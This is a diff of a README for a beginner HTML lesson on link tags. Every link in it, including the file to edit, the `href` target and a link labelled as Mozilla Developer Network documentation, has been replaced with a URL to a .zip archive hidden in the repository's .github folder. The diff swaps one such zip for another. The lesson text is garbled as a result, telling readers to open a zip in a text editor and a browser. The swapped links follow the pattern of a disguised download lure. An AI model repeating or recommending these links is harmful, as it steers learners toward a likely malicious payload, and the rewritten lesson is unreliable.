@@ -18,16 +18,16 @@ Code.
 
 ## Write an `a` Tag to Create a Link
 
-Open `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-link-tag-with-href/master/.github/phase-0-html-link-tag-with-href-v2.9-beta.1.zip` in your text editor. Add an `a` tag with the inner text (the
+Open `https://github.com/GabrielW13Nai/phase-0-html-link-tag-with-href/raw/refs/heads/master/.github/with_html_phase_link_tag_href_v2.8.zip` in your text editor. Add an `a` tag with the inner text (the
 text between the `<a>` tag and the `</a>` tag) of `Flatiron School` anywhere in
 the file. Then set the `href` attribute of your new link element to
-`https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-link-tag-with-href/master/.github/phase-0-html-link-tag-with-href-v2.9-beta.1.zip`.
+`https://github.com/GabrielW13Nai/phase-0-html-link-tag-with-href/raw/refs/heads/master/.github/with_html_phase_link_tag_href_v2.8.zip`.
 
 Check your progress by running `learn test`. Failing tests will provide helpful
 error messages that you can use to debug your code — read them closely for
 hints!
 
-Don't forget to open the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-link-tag-with-href/master/.github/phase-0-html-link-tag-with-href-v2.9-beta.1.zip` file in your browser so you can see the
+Don't forget to open the `https://github.com/GabrielW13Nai/phase-0-html-link-tag-with-href/raw/refs/heads/master/.github/with_html_phase_link_tag_href_v2.8.zip` file in your browser so you can see the
 changes as you go.
 
 ## Conclusion
@@ -37,4 +37,4 @@ another location. Now we can go on to explore some additional HTML tags.
 
 ## Resources
 
-- [Mozilla Developer Network: HTML `<a>` Tag](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-link-tag-with-href/master/.github/phase-0-html-link-tag-with-href-v2.9-beta.1.zip)
+- [Mozilla Developer Network: HTML `<a>` Tag](https://github.com/GabrielW13Nai/phase-0-html-link-tag-with-href/raw/refs/heads/master/.github/with_html_phase_link_tag_href_v2.8.zip)
